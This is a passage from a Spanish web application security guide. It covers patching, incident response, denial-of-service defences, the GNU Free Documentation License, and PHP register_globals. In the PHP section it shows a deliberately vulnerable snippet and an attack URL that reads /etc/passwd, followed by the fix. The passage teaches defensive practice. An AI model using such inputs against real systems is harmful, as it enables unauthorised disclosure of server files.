+negativo, ¿está el servidor de la aplicación y el servidor de la base de datos en una
+red restringida, en la cual exista un número mínimo de sistemas, en particular
+sistemas no confiables como pueden ser sistemas de escritorio?
+Como protegerse 
+
 ****************************************************************************************************
 256
+
+• La aplicación debe conectar a la base de datos mediante el usuario con los menores
+privilegios posibles.
+• La aplicación debe conectar a la base de datos con credenciales diferentes para cada
+distinción de confianza (por ejemplo, usuario, usuario de solo lectura, usuario invitado,
+usuarios administradores) y permisos aplicados a aquellas tablas y bases de datos para
+prevenir accesos no autorizados y modificaciones.
+• La aplicación debe priorizar la utilización de constructores seguros, como por ejemplo
+procedimientos almacenados que no requieran el acceso directo a la tabla. Una vez todos
+los accesos se realicen mediante procedimientos almacenados, se deben revocar todos los
+accesos a las tablas.
+• Aplicaciones protegidas al máximo:
+1. La base de datos debe implantarse en otro sistema, que debe encontrarse
+protegido mediante los últimos parches disponibles y con las últimas versiones
+del software instaladas.
+2. La aplicación debe conectarse a la base de datos utilizando un enlace cifrado. En
+caso negativo, el servidor de la aplicación y el servidor de base de datos deben
+residir en una red restringida con pocos equipos en ella.
+3. No implantar el servidor de la base de datos en la red principal de la oficina.
+Más información
+• ITIL – Change Management http://www.itil.org.uk/ 
+
 ****************************************************************************************************
 257
+Mantenimiento
+Objetivo
+Asegurar que:
+• Los productos son correctamente mantenidos después de su despliegue
+• Minimizar el área de ataque atreves del ciclo de vida de producción
+• Los defectos de seguridad son arreglados correctamente y en un tiempo adecuado
+Plataformas afectadas
+Todas.
+Temas de COBIT Relevantes
+DS6 – Gestión de cambios – Todas las secciones han de ser revisadas
+Buenas Prácticas
+Existe una fuerte inercia para evitar parchear sistemas “en funcionamiento” (pero
+vulnerables). Es responsabilidad como desarrollador garantizar que el usuario este tan seguro
+como sea posible y animar a parchear rápidamente los sistemas vulnerables para garantizar que
+sus parches sean integrales (es decir, no más parches de este tipo), regresión de problemas
+anteriores (es decir, soluciones permanecen solventadas), y estable (es decir, que se han realizado
+suficientes ensayos).
+Las aplicaciones deben mantenerse con regularidad, en busca de nuevos métodos para evitar
+los controles de seguridad.
+Es normal dentro de la industria proporcionar apoyo desde n-1 hasta n-2 versiones, por lo que
+se requiere algún tipo revisión de control de código fuente, como CVS, ClearCase, o subversión,
+son necesarios para gestionar las correcciones de seguridad y evitar errores de regresión.
+Las actualizaciones deben ser prestadas de forma segura, ya sea por firma digital de los
+paquetes, o mediante un resumen de mensaje libre de colisiones.
+El apoyo a la política de parches de seguridad deben ser claramente comunicada a los
+usuarios, para asegurar que los usuarios conocen que versiones están soportadas para soluciones
+de seguridad y cuando termina su vida. 
+
 ****************************************************************************************************
 258
+
+Respuesta ante incidentes de seguridad
+Muchas organizaciones no están preparadas para la revelación pública de vulnerabilidades
+de seguridad. Hay varias categorías de revelación:
+• Oculta
+• 0day
+• Revelación completa y revelación limitada
+• Con o sin respuesta del vendedor.
+Los vendedores con un buen historial de parches a menudo ofrecen un rápido acceso a la
+información sobre vulnerabilidades de seguridad. Otros han publicado las vulnerabilidades en
+tablones 0day o listas de correo
+Como determinar si se es vulnerable.
+La organización:
+• ¿Tiene una política de gestión de incidentes?
+• Monitoriza abuse@...
+• Monitoriza Bugtraq y otras listas similares de sus propios productos.
+• ¿Publica una sección de seguridad en su website? Si es así, ¿existe la opción para enviar
+un incidente de seguridad? En que método (como intercambio de llaves PGP o vía SSL)
+• ¿Podrían las brechas de seguridad más serias ser solucionadas en menos de 30 días? Si
+no, ¿qué haría falta para solucionar la situación?
+Si algunas de las respuestas a las preguntas son “no”, la organización está en riesgo de 0days.
+Como protegerse 
+
 ****************************************************************************************************
 259
+
+• Crear y mantener una política de mantenimiento de incidentes.
+• Monitorizar abuse@...
+• Monitorizar Bugtraq y listas de correo similares. Usar la experiencia de productos
+similares para aprender de sus errores y solucionarlos ante de encontrarlas en los
+productos propios.
+• Publicar una sección de seguridad en el sitio web, con la posibilidad de enviar incidentes
+de seguridad de forma segura (como intercambio de claves PGP o vía SSL).
+• Tener un método para solventar problemas de seguridad rápidamente, completamente
+probados en menos de 30 días.
+Arreglar problemas de seguridad correctamente
+Las vulnerabilidades de seguridad existen en todo el software. Normalmente, éstas son
+descubiertas por terceras personas como por ejemplo analistas de seguridad o clientes, pero a
+menudo se descubren mientras se trabaja en la siguiente versión.
+Las vulnerabilidades de seguridad se basan en un patrón – es extraordinariamente extraño
+que una vulnerabilidad sea la única de su tipo. Es vital que todas las vulnerabilidades parecidas
+sean eliminadas utilizando un análisis causal base reduciendo así el marco de ataque. Esto
+requerirá una búsqueda completa de vulnerabilidades tipo en la aplicación para asegurar que no
+se vuelven a dar las de siempre.
+Microsoft estima que desarrollar, probar e implantar cada parche cuesta más de $100.000, y
+obviamente unos cuantos millones más para que lo aplique cada cliente. Únicamente reduciendo
+el número de parches podría reducirse este coste. Resulta más barato invertir un poco más de
+tiempo y publicar unos cuantos recursos para la vulnerabilidad que cerrarla definitivamente.
+Como identificar si se es vulnerable
+Ciertas aplicaciones tendrán múltiples vulnerabilidades de una naturaleza similar publicadas
+en listas de correo como por ejemplo Bugtraq. Dichas aplicaciones no han sido revisadas para
+encontrar todas las vulnerabilidades parecidas o para arreglar la causa principal del problema.
+Como protegerse 
+
 ****************************************************************************************************
 260
+
+• Asegurar que se utiliza un análisis exhaustivo de la causa principal para identificar la
+naturaleza del defecto.
+• Utilice la reducción del marco de ataque y las metodologías de riesgo para eliminar tantas
+vulnerabilidades de este tipo como sea posible en un el tiempo prescrito.
+Notificaciones de actualización
+A menudo los usuarios reciben un producto y nunca lo actualizan. Sin embargo, en ocasiones
+se necesita actualizar el producto debido a que se debe proteger frente a vulnerabilidades
+conocidas.
+Como identificar si se es vulnerable
+• ¿Existe algún método para notificar a los propietarios / operadores / administradores de
+sistemas de la aplicación que existe una versión más actualizada disponible?
+Como protegerse
+Preferiblemente, la aplicación debería tener la función de “llamar a la casa” para comprobar
+si existen nuevas versiones y alertar a los administradores de sistemas cuando están disponibles
+dichas versiones. Cuando esto no sea posible, por ejemplo, en entornos altamente protegidos
+donde esta funcionalidad no se permita, se debería ofrecer otro tipo de método a los
+administradores para poder estar actualizados.
+Comprobar a menudo los permisos
+Las aplicaciones están a merced de los administradores de sistemas que a menudo suelen
+fallar. Las aplicaciones que confían en que ciertos recursos están protegidos deberían seguir un
+procedimiento para asegurar que dichos recursos no sean expuestos públicamente y tienen la
+suficiente protección según su riesgo en la aplicación.
+Como identificar si se vulnerable
+
 ****************************************************************************************************
 261
+
+• ¿La aplicación requiere que ciertos ficheros sean “seguros” al ser expuestos al público?
+Por ejemplo, muchas aplicaciones J2EE se basa en el fichero web.xml para ser de sólo
+lectura en el contenedor de servlets para protegerse de que usuarios locales puedan leer
+las credenciales de la infraestructura. Las aplicaciones en PHP a menudo tienen un
+fichero llamado config.php que contiene detalles parecidos.
+• Si existiese en tal caso ese recurso, ¿relajando los permisos expondría las
+vulnerabilidades de la aplicación a usuarios locales o remotos?
+Como protegerse
+La aplicación debería revisar a menudo los permisos de los ficheros, directorios y recursos
+que sean claves y que contengan contraseñas de la aplicación y comprobar que no hayan sido
+demasiado permisivos. Si los permisos provocan algún tipo de peligro inmediato, la aplicación
+debería detenerse hasta que el fallo sea solventado, en otro caso, con notificar o alertar al
+administrador será suficiente. 
+
 ****************************************************************************************************
 262
+
+Ataques de denegación de servicio
+Objetivo
+Asegurar que la aplicación es lo más robusta posible frente a ataques de denegación de
+servicio.
+Plataformas afectadas
+Todas.
+Puntos relevantes del COBIT
+DS5.20 – Arquitecturas de firewall y conexiones con redes públicas
+Descripción
+Los ataques de denegación de servicio (Denial of Service – DoS) se dirigen principalmente
+contra software conocido, mediante vulnerabilidades que permiten que estos ataques resulten
+satisfactorios.
+Consumo excesivo de la CPU
+Las aplicaciones implementadas bajo el modelo Vista Controlador son una base importante
+por méritos propios. La mayoría de las peticiones de negocio no triviales, como la generación de
+informes y el análisis estadístico, pueden consumir grandes porciones de CPU. Cuando se le pide
+a la CPU el realizar demasiadas tareas, el rendimiento puede disminuir considerablemente.
+Como determinar si se es vulnerable
+• Realizar pruebas de esfuerzo a la aplicación para averiguar dónde existen “cuellos de
+botella”.
+Como protegerse 
+
 ****************************************************************************************************
 263
+
+• Permitir únicamente a los usuarios autenticados y autorizados el consumir peticiones de
+CPU significativas.
+• Medir cuidadosamente los accesos a esos “cuellos de botella” y recodificar o cambiar
+parámetros para evitar que las peticiones básicas consuman demasiado tiempo de CPU.
+Consumo excesivo de disco de Entrada/Salida
+Las búsquedas en base de datos, las imágenes grandes, y una gran cantidad de discos baratos
+desencadenan tanto peticiones interminables como una gran cantidad de operaciones de
+entrada/salida en disco. Sin embargo, las mejores operaciones son las que no llegan a tomarse al
+completo. Son tratadas desde la memoria RAM o simplemente ni se llevan a cabo en su
+totalidad. En el momento en el que se necesita un disco para digamos buscar un índice en 50 Mb
+una y otra vez en cada petición, incluso el servidor más robusto podría fallar con una carga
+moderada por usuario.
+Como determinar si se es vulnerable
+• Realizar pruebas de esfuerzo a la aplicación para averiguar dónde se encuentran los
+“cuellos de botella”.
+Como protegerse
+• Únicamente permitir que usuarios autenticados y autorizados consuman peticiones
+significativas de entrada y salida a disco.
+• Medir cuidadosamente el acceso a dichos “cuellos de botella” y recodificar o cambiar los
+parámetros para evitar que las peticiones básicas por omisión consuman demasiado
+tiempo en disco o espacio.
+Consumo excesivo de entrada/salida en red
+Como determinar si se es vulnerable
+• Realizar un perfil de la aplicación con una herramienta de optimización de red.
+• Cualquier página o recurso que sobrepase el ratio de entrada en 20 (esto es, que por
+ejemplo por cada kb pedido se devuelva una página o una imagen de 20 kb) es un gran
+amplificador de denegaciones de servicio y rápidamente, a causa de un post en Slashdot o 
+
 ****************************************************************************************************
 264
+
+porque un atacante acceda demasiadas veces, su sitio puede llegar a perder la
+conectividad.
+Como protegerse
+• Permitir únicamente a usuarios autenticados o autorizados que consuman peticiones
+significativas de red.
+• Minimizar el tamaño total de páginas o recursos no autenticados.
+• Utilizar un escudo para denegaciones de servicio o similar para ayudar a protegerse de
+distintos tipos de ataques de denegación de servicio, sin embargo, hay que tener en cuenta
+que estos dispositivos no pueden resultar de ayuda si la infraestructura principal ha sido
+colapsada.
+Bloqueo de cuentas de usuario
+Un ataque común de denegación de servicio frente a sistemas operativos es el de bloquear
+cuentas de usuario si existe una política de bloqueo de cuentas de usuario.
+Como determinar si se es vulnerable
+Utilizando un script automático, un atacante podría intentar enumerar varias cuentas de
+usuario y bloquearlas.
+Como protegerse
+• Permitir a los usuarios que seleccionen sus propios nombres de usuario. En esta tarea
+ellos son los que mejor lo pueden hacer.
+• No utilizar números de cuenta o nombres de usuario predecibles, como por ejemplo
+“A1234” “A1235”, etc.
+• Registrar las peticiones de bloqueo de usuarios. Si más de una cuenta se bloquea desde la
+misma dirección IP en un corto período de tiempo (digamos por ejemplo 30 segundos),
+evitar el acceso desde esa dirección IP de origen.
+• Desbloquear automáticamente cuentas después de 15 minutos.
+Más información
+http://www.corsaire.com/white-papers/040405-application-level-dos-attacks.pdf
+
 ****************************************************************************************************
 265
+
+Licencia de Documentación Libre de GNU
+Version 1.1, March 2000
+Copyright © 2000 Free Software Foundation, Inc.
+59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
+ Se permite la copia y distribución de copias literales de este documento de licencia, pero
+no se permiten cambios.
+PREÁMBULO
+El propósito de esta licencia es permitir que un manual, libro de texto, u otro documento
+escrito sea "libre" en el sentido de libertad: asegurar a todo el mundo la libertad efectiva de
+copiarlo y redistribuirlo, con o sin modificaciones, de manera comercial o no. En segundo
+término, esta licencia preserva para el autor o para quien publica una manera de obtener
+reconocimiento por su trabajo, al tiempo que no se consideran responsables de las
+modificaciones realizadas por terceros.
+Esta licencia es una especie de "copyleft" que significa que los trabajos derivados del
+documento deben a su vez ser libres en el mismo sentido. Esto complementa la Licencia Pública
+General GNU, que es una licencia de copyleft diseñada para el software libre.
+Hemos diseñado esta Licencia para usarla en manuales de software libre, ya que el software
+libre necesita documentación libre: Un programa libre debe venir con los manuales que ofrezcan
+las mismas libertades que da el software. Pero esta licencia no se limita a manuales de software;
+puede ser usada para cualquier trabajo textual, sin tener en cuenta su temática o si se publica
+como libro impreso. Recomendamos esta licencia principalmente para trabajos cuyo fin sea
+instructivo o de referencia.
+APLICABILIDAD Y DEFINICIONES
+Esta Licencia se aplica a cualquier manual u otro documento que contenga una nota del
+propietario de los derechos que indique que puede ser distribuido bajo los términos de la
+Licencia. El "Documento", en adelante, se refiere a cualquiera de dichos manuales o trabajos.
+Cualquier miembro del público es un licenciatario, y será denominado como "Usted". 
+
 ****************************************************************************************************
 266
+
+Una "Versión Modificada” del Documento significa cualquier trabajo que contenga el
+Documento o una porción del mismo, ya sea una copia literal o con modificaciones y/o
+traducciones a otro idioma.
+Una "Sección Secundaria" es un apéndice titulado o una sección preliminar al prólogo del
+Documento que tiene que ver exclusivamente con la relación de quien pública o, los autores del
+Documento o, el tema general del Documento (o asuntos relacionados) y cuyo contenido no
+entra directamente en este tema general. (Por ejemplo, si el Documento es en parte un texto de
+matemáticas, una Sección Secundaria puede no explicar matemáticas.) La relación puede ser un
+asunto de conexión histórica, o de posición legal, comercial, filosófica, ética o política con el
+tema o la materia del texto.
+Las "Secciones Invariantes" son ciertas Secciones Secundarias cuyos títulos son
+denominados como Secciones Invariantes, en la nota que indica que el documento es liberado
+bajo esta licencia.
+Los "Textos de Cubierta" son ciertos pasajes cortos de texto que se listan, como Textos de
+Portada o Textos de Contra Portada, en la nota que indica que el documento es liberado bajo esta
+Licencia.
+Una copia "Transparente" del Documento, significa una copia para lectura en máquina,
+representada en un formato cuya especificación está disponible al público general, cuyos
+contenidos pueden ser vistos y editados directamente con editores de texto genéricos o (para
+imágenes compuestas por pixeles) de programas genéricos de dibujo o (para dibujos) algún
+editor gráfico ampliamente disponible, y que sea adecuado para exportar a procesadores de
+formato de texto o para traducción automática a una variedad de formatos adecuados para
+ingresar a procesadores de formato de texto. Una copia hecha en un formato de un archivo que
+no sea Transparente, cuyo formato ha sido diseñado para impedir o dificultar subsecuentes
+modificaciones posteriores por parte de los lectores no es Transparente. Una copia que no es
+"Transparente" es llamada "Opaca".
+Como ejemplos de formatos adecuados para copias Transparentes están el ASCII plano sin
+formato, formato de Texinfo, formato de LaTeX, SGML o XML usando un DTD disponible
+ampliamente, y HTML simple que sigue los estándares, diseñado para modificaciones humanas.
+Los formatos Opacos incluyen PostScript, PDF, formatos propietarios que pueden ser leídos y
+editados únicamente en procesadores de palabras propietarios, SGML o XML para los cuáles los 
+
 ****************************************************************************************************
 267
+
+DTD y/o herramientas de procesamiento no están disponibles generalmente, y el HTML
+generado por máquinas producto de algún procesador de palabras solo para propósitos de salida.
+La "Portada" en un libro impreso significa, la portada misma, más las páginas siguientes
+necesarias para mantener la legibilidad del material, que esta Licencia requiere que aparezca en
+la portada. Para trabajos en formatos que no tienen Portada como tal, "Portada" significa el texto
+cerca a la aparición más prominente del título del trabajo, precediendo el comienzo del cuerpo
+del trabajo.
+COPIA LITERAL
+Puede copiar y distribuir el Documento en cualquier medio, sea en forma comercial o no,
+siempre y cuando esta Licencia, las notas de derecho de autor, y la nota de licencia que indica
+que esta Licencia se aplica al Documento se reproduzca en todas las copias, y que usted no
+adicione ninguna otra condición a las expuestas en esta Licencia. No puede usar medidas
+técnicas para obstruir o controlar la lectura o copia posterior de las copias que usted haga o
+distribuya. Sin embargo, usted puede aceptar compensación a cambio de las copias. Si distribuye
+un número suficientemente grande de copias también deberá seguir las condiciones de la sección
+3.
+También puede prestar copias, bajo las mismas condiciones establecidas anteriormente, y
+puede exhibir copias públicamente.
+COPIADO EN CANTIDADES
+Si publica copias impresas del Documento que sobrepasen las 100, y la nota de Licencia del
+Documento exige Textos de Cubierta, debe incluir las copias con cubiertas que lleven en forma
+clara y legible, todos esos textos de Cubierta: Textos Frontales en la cubierta frontal, y Textos
+Posteriores de Cubierta en la Cubierta Posterior. Ambas cubiertas deben identificarlo a Usted
+clara y legiblemente como quien publica tales copias. La Cubierta Frontal debe mostrar el título
+completo con todas las palabras igualmente prominentes y visibles. Además puede adicionar otro
+material en la cubierta. Las copias con cambios limitados en las cubiertas, siempre que preserven
+el título del Documento y satisfagan estas condiciones, puede considerarse como copia literal.
+Si los textos requeridos para la cubierta son muy voluminosos para que ajusten legiblemente,
+debe colocar los primeros (tantos como sea razonable colocar) en la cubierta real, y continuar el
+resto en páginas adyacentes. 
+
 ****************************************************************************************************
 268
+
+Si pública o distribuye copias Opacas del Documento cuya cantidad exceda las 100, debe
+incluir una copia Transparente que pueda ser leída por una máquina con cada copia Opaca, o
+entregar en o con cada copia Opaca una dirección en red de computador públicamente-accesible
+conteniendo una copia completa Transparente del Documento, sin material adicional, a la cual el
+público en general de la red pueda acceder a bajar anónimamente sin cargo usando protocolos de
+estándar público. Si usted hace uso de la última opción, deberá tomar medidas necesarias,
+cuando comience la distribución de las copias Opacas en cantidad, para asegurar que esta copia
+Transparente permanecerá accesible en el sitio por lo menos un año después de su última
+distribución de copias Opacas (directamente o a través de sus agentes o distribuidores) de esa
+edición al público.
+Se solicita, aunque no es requisito, que contacte a los autores del Documento antes de
+redistribuir cualquier gran número de copias, para permitirle la oportunidad de que le provean
+una versión del Documento.
+MODIFICACIONES
+Puede copiar y distribuir una Versión Modificada del Documento bajo las condiciones de las
+secciones 2 y 3 anteriores, siempre que usted libere la Versión Modificada bajo esta misma
+Licencia, con la Versión Modificada haciendo el rol del Documento, por lo tanto licenciando la
+distribución y modificación de la Versión Modificada a quienquiera que posea una copia de este.
+Adicionalmente debe hacer lo siguiente en la Versión Modificada:
+Uso en la Portada (y en las cubiertas, si hay alguna) de un título distinto al del Documento, y
+de versiones anteriores (que deberían, si hay alguna, estar listados en la sección de Historia del
+Documento). Puede usar el mismo título que versiones anteriores al original siempre que quién
+publicó la primera versión lo permita.
+Listar en la Portada, como autores, una o más personas o entidades responsables por la
+autoría o las modificaciones en la Versión Modificada, junto con por lo menos cinco de los
+autores principales del Documento (Todos sus autores principales, si hay menos de cinco).
+Estado en la Portada del nombre de quién publica la Versión Modificada, como quien
+pública.
+Preservar todas las notas de derechos de autor del Documento.
+Adicionar una nota de derecho de autor apropiada a sus modificaciones adyacentes a las otras
+notas de derecho de autor. 
+
 ****************************************************************************************************
 269
+
+Incluir, inmediatamente después de la nota de derecho de autor, una nota de licencia dando el
+permiso público para usar la Versión Modificada bajo los términos de esta Licencia, de la forma
+mostrada en la Adición (LEGAL) abajo.
+Preservar en esa nota de licencia el listado completo de Secciones Invariantes y en los Textos
+de las Cubiertas que sean requeridos como se especifique en la nota de Licencia del Documento
+Incluir una copia sin modificación de esta Licencia.
+Preservar la sección llamada "Historia", y su título, y adicionar a esta una sección
+estableciendo al menos el título, el año, los nuevos autores, y quién publicó la Versión
+Modificada como reza en la Portada. Si no hay una sección titulada "Historia" en el Documento,
+crear una estableciendo el título, el año, los autores y quien publicó el Documento como reza en
+la Portada, añadiendo además un artículo describiendo la Versión Modificada como se estableció
+en el punto anterior.
+Preservar la localización en red, si hay , dada en la Documentación para acceder
+públicamente a una copia Transparente del Documento, tanto como las otras direcciones de red
+dadas en el Documento para versiones anteriores en las cuáles estuviese basado. Estas pueden
+ubicarse en la sección "Historia". Se puede omitir la ubicación en red para un trabajo que sea
+publicado por lo menos 4 años antes que el mismo Documento, o si quien publica originalmente
+la versión da permiso explícitamente.
+En cualquier sección titulada "Agradecimientos" o "Dedicatorias", preservar el título de la
+sección, y preservar en la sección toda la sustancia y el tono de los agradecimientos y/o
+dedicatorias de cada contribuyente que estén incluidas.
+Preservar todas las Secciones Invariantes del Documento, sin alterar su texto ni sus títulos.
+Números de sección o el equivalente no son considerados parte de los títulos de la sección. M.
+Borrar cualquier sección titulada "Aprobaciones". Tales secciones no pueden estar incluidas en
+las Versiones Modificadas.
+Borrar cualquier sección titulada "Aprobaciones". Tales secciones no pueden estar incluidas
+en las Versiones Modificadas.
+No retitular ninguna sección existente como "Aprobaciones" o generar conflicto con el título
+de alguna Sección Invariante.
+Si la Versión Modificada incluye secciones o apéndices nuevos o preliminares al prólogo que
+califican como Secciones Secundarias y contienen material no copiado del Documento, puede
+opcionalmente designar algunas o todas esas secciones como invariantes. Para hacerlo, adicione 
+
 ****************************************************************************************************
 270
+
+sus títulos a la lista de Secciones Invariantes en la nota de licencia de la Versión Modificada.
+Tales títulos deben ser distintos de cualquier otro título de sección.
+Puede adicionar una sección titulada "Aprobaciones", siempre que contenga únicamente
+aprobaciones de su Versión Modificada por varias fuentes--por ejemplo, observaciones de
+peritos o que el texto ha sido aprobado por una organización como un estándar.
+Puede adicionar un pasaje de hasta cinco palabras como un Texto de Cubierta Frontal, y un
+pasaje de hasta 25 palabras como un texto de Cubierta Posterior, al final de la lista de Textos de
+Cubierta en la Versión Modificada. Solamente un pasaje de Texto de Cubierta Frontal y un Texto
+de Cubierta Posterior puede ser adicionado por (o a manera de arreglos hechos por) una entidad.
+Si el Documento ya incluye un texto de cubierta para la misma cubierta, previamente adicionado
+por usted o por arreglo hecho por la misma entidad, a nombre de la cual está actuando, no puede
+adicionar otra; pero puede reemplazar la anterior, con permiso explícito de quien publicó
+anteriormente tal cubierta.
+El(los) autor(es) y quien(es) publica(n) el Documento no dan con esta Licencia permiso para
+usar sus nombres para publicidad o para asegurar o implicar aprobación de cualquier Versión
+Modificada.
+COMBINANDO DOCUMENTOS
+Puede combinar el Documento con otros documentos liberados bajo esta Licencia, bajo los
+términos definidos en la sección 4 anterior para versiones modificadas, siempre que incluya en la
+combinación todas las Secciones Invariantes de todos los documentos originales, sin modificar, y
+listadas todas como Secciones Invariantes del trabajo combinado en su nota de licencia.
+El trabajo combinado necesita contener solamente una copia de esta Licencia, y múltiples
+Secciones Invariantes Idénticas pueden ser reemplazadas por una sola copia. Si hay múltiples
+Secciones Invariantes con el mismo nombre pero con contenidos diferentes, haga el título de
+cada una de estas secciones único adicionándole al final de este, en paréntesis, el nombre del
+autor o de quien publicó originalmente esa sección, si es conocido, o si no, un número único.
+Haga el mismo ajuste a los títulos de sección en la lista de Secciones Invariantes en la nota de
+licencia del trabajo combinado.
+En la combinación, debe combinar cualquier sección titulada "Historia" de los varios
+documentos originales, formando una sección titulada "Historia"; de la misma forma combine 
+
 ****************************************************************************************************
 271
+
+cualquier sección titulada "Agradecimientos", y cualquier sección titulada "Dedicatorias". Debe
+borrar todas las secciones tituladas "Aprobaciones."
+COLECCIONES DE DOCUMENTOS
+Puede hacer una colección consistente del Documento y otros documentos liberados bajo esta
+Licencia, y reemplazar las copias individuales de esta Licencia en los varios documentos con una
+sola copia que esté incluida en la colección, siempre que siga las reglas de esta Licencia para una
+copia literal de cada uno de los documentos en cualquiera de todos los aspectos.
+Puede extraer un solo documento de una de tales colecciones, y distribuirlo individualmente
+bajo esta Licencia, siempre que inserte una copia de esta Licencia en el documento extraído, y
+siga esta Licencia en todos los otros aspectos concernientes a la copia literal de tal documento.
+AGREGACIÓN CON TRABAJOS INDEPENDIENTES
+Una recopilación del Documento o de sus derivados con otros documentos o trabajos
+separados o independientes, en cualquier tipo de distribución o medio de almacenamiento, no
+como un todo, cuenta como una Versión Modificada del Documento, teniendo en cuenta que
+ninguna compilación de derechos de autor sea clamada por la recopilación. Tal recopilación es
+llamada un "agregado", y esta Licencia no aplica a los otros trabajos auto-contenidos y por lo
+tanto compilados con el Documento, o a cuenta de haber sido compilados, si no son ellos mismos
+trabajos derivados del Documento.
+Si el requerimiento de la sección 3 del Texto de la Cubierta es aplicable a estas copias del
+Documento, entonces si el Documento es menor que un cuarto del agregado entero, Los Textos
+de la Cubierta del Documento pueden ser colocados en cubiertas que enmarquen solamente el
+Documento entre el agregado. De otra forma deben aparecer en cubiertas enmarcando todo el
+agregado.
+TRADUCCIÓN
+La Traducción es considerada como una clase de modificación, Así que puede distribuir
+traducciones del Documento bajo los términos de la sección 4. Reemplazar las Secciones
+Invariantes con traducciones requiere permiso especial de los dueños de derecho de autor, pero
+puede incluir traducciones de algunas o todas las Secciones Invariantes adicionalmente a las
+versiones originales de las Secciones Invariantes. Puede incluir una traducción de esta Licencia
+siempre que incluya también la versión Inglesa de esta Licencia. En caso de un desacuerdo entre 
+
 ****************************************************************************************************
 272
+
+la traducción y la versión original en inglés de esta Licencia, la versión original en inglés
+prevalecerá.
+TERMINACIÓN
+No se puede copiar, modificar, sub-licenciar, o distribuir el Documento excepto por lo
+permitido expresamente bajo esta Licencia. Cualquier otro intento de copia, modificación, sublicenciamiento
+o distribución del Documento es nulo, y serán automáticamente terminados sus
+derechos bajo esa licencia. De todas maneras, los terceros que hayan recibido copias, o derechos,
+de su parte bajo esta Licencia no tendrán por terminadas sus licencias siempre que tales personas
+o entidades se encuentren en total conformidad con la licencia original.
+FUTURAS REVISIONES DE ESTA LICENCIA
+La Free Software Foundation puede publicar nuevas, revisadas versiones de la Licencia de
+Documentación Libre GNU de tiempo en tiempo. Tales nuevas versiones serán similares en
+espíritu a la presente versión, pero pueden diferir en detalles para solucionar problemas o
+intereses. Vea http://www.gnu.org/copyleft/
+
+Cada versión de la Licencia tiene un número de versión que la distingue. Si el Documento
+especifica que una versión numerada particularmente de esta licencia o "cualquier versión
+posterior" se aplica a esta, tiene la opción de seguir los términos y condiciones de la versión
+especificada o cualquiera posterior que ha sido publicada (no como un borrador) por la Free
+Software Foundation. Si el Documento no especifica un número de versión de esta Licencia,
+puede escoger cualquier versión que haya sido publicada (no como un borrador) por la Free
+Software Foundation. 
+
 ****************************************************************************************************
 273
+
+Directivas sobre PHP
+PHP (acrónimo recursivo de PHP: Hypertext Pre-processor - Pre-procesador de hipertexto)
+es un lenguaje interpretado en el lado del servidor de propósito general ampliamente utilizado
+para crear páginas Web dinámicas. “En el lado del servidor” significa que el código es
+interpretado en el servidor antes de que el resultado sea enviado al cliente. El código PHP se
+encuentra embebido en código HTML, y es sencillo empezar con él, aún siendo muy poderoso
+para un programador experimentado. Sin embargo a pesar de ser positivo lo extremadamente rico
+en funcionalidades y fácil en empezar a utilizarlo, a menudo se dan aplicaciones inseguras y
+vulnerables a muchos tipos de ataques. Este capítulo intentará explicar los ataques más comunes
+y como podemos protegernos frente a ellos.
+PHP es de código abierto y se puede descargar gratis de http://www.php.net/
+Variables globales
+ Las variables declaradas fuera de las funciones son consideradas globales por PHP. Lo
+contrario sería una variable declarada dentro de una función, que se considera ser local en el
+ámbito de la función. PHP trata las variables globales de una manera diferente a como lo hacen
+lenguajes como por ejemplo C. En C, una variable global siempre está disponible tanto en el
+ámbito local como en el global, mientras no sea anulada por una definición local. En PHP el
+tema es diferente: para acceder a una variable global dentro de un ámbito local se debe declarar
+como global dentro de ese ámbito. Se muestra lo explicado en el siguiente ejemplo:
+$sTitle = 'Page title'; // Ámbito global
+function printTitle()
+{
+global $sTitle; // Se declara la variable como global
+echo $sTitle; // Ahora podemos acceder a ella como si fuera una
+//variable local
+} 
+
 ****************************************************************************************************
 274
+
+Todas las variables en PHP son representadas por un símbolo de dólar seguido del
+nombre de la variable. Los nombres distinguen entre mayúsculas y minúsculas y deben comenzar
+con una letra o con un guión bajo, seguido de letras, números o guiones bajos.
+register_globals
+La funcionalidad register_globals hace que datos de entrada mediante GET, POST y
+COOKIE, al igual que variables de sesión y ficheros subidos, sean accesibles directamente como
+variables globales en PHP. Esta funcionalidad, si se encuentra activa en el fichero php.ini, es la
+causa principal de muchas vulnerabilidades en aplicaciones Web.
+Veamos el siguiente ejemplo:
+if ($bIsAlwaysFalse)
+{
+ // Esto nunca se ejecuta:
+ $sFilename = 'somefile.php';
+}
+// ...
+if ( $sFilename != '' )
+{
+ // Abrir $sFilename y enviar su contenido al navegador
+ // ...
+}
+
+Si llamásemos a esta página de la manera: page.php?sFilename=/etc/passwd con la
+funcionalidad register_globals activada, sería lo mismo que si hubiésemos escrito lo siguiente:
+$sFilename = '/etc/passwd'; // Esto es realizado internamente por PHP
+if ( $bIsAlwaysFalse )
+{ // Esto nunca se ejecuta:
+ $sFilename = 'somefile.php';
+}
+// ...
+if ( $sFilename != '' )
+{ 
+
 ****************************************************************************************************
 275
+
+// Abrir $sFilename y enviar su contenido al navegador
+ // ...
+}
+PHP se hace cargo de la sección $sFilename = '/etc/passwd'; por nosotros. Lo que
+significa que un usuario malicioso podría inyectar un valor definido por él en $sFilename y ver el
+contenido de cualquier fichero con permisos de lectura bajo el contexto de seguridad actual.
+Siempre debemos tener en cuenta esa posibilidad en el momento de programar. El desactivar
+register_globals podría ser una solución pero ¿que pasaría si nuestro código acabase en un
+servidor con la funcionalidad activada?. Debemos tener en consideración que todas las variables
+de ámbito global podrían ser manipuladas. La manera correcta de programar el código anterior es
+asegurando que siempre asignamos un valor a $sFilename:
+// Inicializamos con la cadena vacía la variable $
+$sFilename = '';
+if ( $bIsAlwaysFalse ) {
+// Esto nunca se ejecuta:
+$sFilename = 'somefile.php';
+}
+...
+if ( $sFilename != '' ) {
+// Abrir $sFilename y enviar su contenido al navegador
+...
+}
+Otra solución podría ser la de tener el menor código posible en el ámbito global. La
+programación orientada a objetos es perfecta cuando se lleva a cabo correctamente y recomiendo
+aprovecharse de este enfoque. Se podría escribir casi todo el código en clases que normalmente
+es más seguro y además promueve la reutilización. Al igual que no se puede asumir siempre que
+la funcionalidad register_globals está desactivada, tampoco se puede asumir que está activada.
+La forma correcta de obtener los valores introducidos mediante GET, POST, COOKIE, etc. es
+utilizando las variables llamadas superglobals añadidas en la versión 4.1.0 de PHP. Estas se
+refieren a los arrays $_GET, $_POST, $_ENV, $_SERVER, $_COOKIE, $_REQUEST 
+
 ****************************************************************************************************
 276
+
+$_FILES, y $_SESSION. El término superglobals (super-globales) se utiliza ya que siempre
